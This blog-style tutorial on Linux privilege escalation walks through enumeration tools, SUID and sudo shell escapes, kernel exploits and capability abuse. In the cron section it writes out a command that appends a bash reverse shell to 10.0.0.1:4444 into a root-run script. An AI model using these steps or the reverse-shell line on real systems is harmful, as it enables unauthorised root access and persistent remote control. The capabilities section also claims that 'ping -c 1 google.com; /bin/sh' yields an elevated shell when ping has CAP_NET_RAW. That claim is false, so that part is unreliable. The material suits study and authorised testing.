---
title: Linux Privilage Escalation
date: 2024-09-20 20:00:00 +0530
categories: [Linux, Privilage Escalation]
tags: [Privilage Escalation, Linux, SUDO, ROOT, SUID]
render_with_liquid: false
---

## Introduction

Linux privilege escalation is all about finding ways to gain higher permissions on a Linux system. This means getting access to the root account or other elevated privileges that you weren’t originally granted. In this blog, we’ll look at different techniques for privilege escalation, complete with practical examples. Let’s dive into the details!

---

## Enumeration: Gathering Information

Before we can escalate our privileges, we need to gather information about the system. This process is called enumeration. It helps us identify potential weaknesses and vulnerabilities that we can exploit. Effective enumeration can be the difference between finding a path to root and hitting a dead end.

### Tools for Enumeration

1. **`nmap`**: This powerful network scanner is indispensable for identifying open ports, running services, and the operating system. Use it like this:
   ```bash
   nmap -sV -sC -O <target-ip>
   ```
   This command runs default scripts, detects versions, and guesses the operating system. Knowing the services running can help you locate vulnerable applications.

2. **`enum4linux`**: While it’s primarily designed for Samba and Windows systems, it can reveal useful information like usernames, shared files, and even passwords.
   ```bash
   enum4linux <target-ip>
   ```

3. **`pspy`**: Use this tool to monitor processes in real-time, especially if you don’t have root access. Look for scripts or commands run by root that you might be able to intercept or modify.
   ```bash
   ./pspy
   ```

4. **Manual Enumeration**: Check system information directly:
   ```bash
   uname -a          # Kernel version
   cat /etc/os-release  # OS details
   id                # Your current privileges
   ```

---

## Automated Tools: Speeding Up the Process

Automated tools are great for quickly identifying common misconfigurations or vulnerabilities. Here are a few popular ones:

1. **`LinEnum.sh`**: This script scans the system for privilege escalation paths like writable files, SUID binaries, and cron jobs.
   ```bash
   ./LinEnum.sh
   ```

2. **`LinPeas.sh`**: A feature-rich script that does everything LinEnum does, plus checks for kernel exploits, capabilities, and more.
   ```bash
   ./linpeas.sh
   ```

3. **`GTFOBins`**: A curated list of Unix binaries that can be used to escalate privileges. If you find a vulnerable binary during enumeration, cross-reference it with GTFOBins for exploitation techniques.
   ```bash
   https://gtfobins.github.io
   ```

---

## SUID Exploitation: Special Permissions

### What are SUID Binaries?

Setuid binaries are executables that run with the permissions of their owner, not the user who executes them. If owned by root, they can be exploited to gain root access.

### How to Find SUID Binaries

Use the `find` command to locate SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```
This command lists all files with the SUID bit set. Look for binaries that you can execute and potentially misuse.

### What to Do If You Find a SUID Binary

1. Check its purpose and usage by running it with `-h` or `--help`.
2. Search for it on GTFOBins to see if it has known exploitation techniques.
3. Test it to see if you can execute arbitrary commands or spawn a shell.

### Example: Exploiting a Custom SUID Binary

Suppose you find a custom binary named `mybinary` owned by root. First, check its functionality. If it allows running arbitrary commands, you can exploit it like this:
```bash
./mybinary -c "/bin/sh"
```
This command spawns a root shell.

---

## SUDO Exploitation: Misconfigured Permissions

The `sudo` command allows users to execute commands with elevated privileges. If it’s misconfigured, it can be exploited.

### How to Find Misconfigured Sudo Permissions

Run the following command to list your `sudo` privileges:
```bash
sudo -l
```
This will show you which commands you can run with `sudo` and under what conditions.

### What to Look For

1. Commands that allow executing shells, editors, or scripts without restrictions.
2. Writable scripts or files run with `sudo` privileges.

### Example: Exploiting Sudo with Vim

If you can run `vim` with `sudo`, you can spawn a root shell like this:
```bash
sudo vim -c ':!/bin/sh'
```
This launches a shell with root privileges.

---

## Cron Jobs: Scheduled Tasks

Cron jobs are scheduled tasks that run automatically. If a cron job runs a writable script, it’s a golden opportunity for privilege escalation.

### How to Find Cron Jobs

1. List system-wide cron jobs:
   ```bash
   cat /etc/crontab
   ```
2. Check user-specific cron jobs:
   ```bash
   crontab -l
   ```

### What to Do If You Find a Writable Script

1. Edit the script to include a malicious command, such as creating a reverse shell:
   ```bash
   echo "/bin/bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'" >> vulnerable_script.sh
   ```
2. Wait for the cron job to execute, and it will connect back to your machine.

---

## Kernel Exploitation: Targeting the Core

Kernel exploits target vulnerabilities in the Linux kernel itself. These can be extremely powerful but require precise conditions.

### How to Find Kernel Vulnerabilities

1. Check the kernel version:
   ```bash
   uname -r
   ```
2. Search for known exploits matching your kernel version on platforms like Exploit-DB.

### Example: Exploiting a Kernel Vulnerability

Suppose you find a buffer overflow vulnerability in your kernel version. Compile and execute the exploit:
```bash
gcc -o exploit exploit.c
./exploit
```
This grants you a root shell.

---

## Capabilities: Limited Privileges

Linux capabilities assign specific privileges to binaries without granting full root access. Misconfigured capabilities can be exploited.

### How to Find Binaries with Capabilities

Use this command to list binaries with special capabilities:
```bash
getcap -r / 2>/dev/null
```

### Example: Exploiting a Misconfigured Capability

If the `ping` binary has the `CAP_NET_RAW` capability, you can exploit it:
```bash
ping -c 1 google.com; /bin/sh
```
This spawns a shell with elevated privileges.

---

## Conclusion

In summary, Linux privilege escalation involves a combination of enumeration, analysis, and exploitation. By thoroughly examining a system’s configurations and permissions, you can identify potential vulnerabilities and use them to gain higher privileges. Always remember to use these techniques ethically and with permission. Happy hacking!
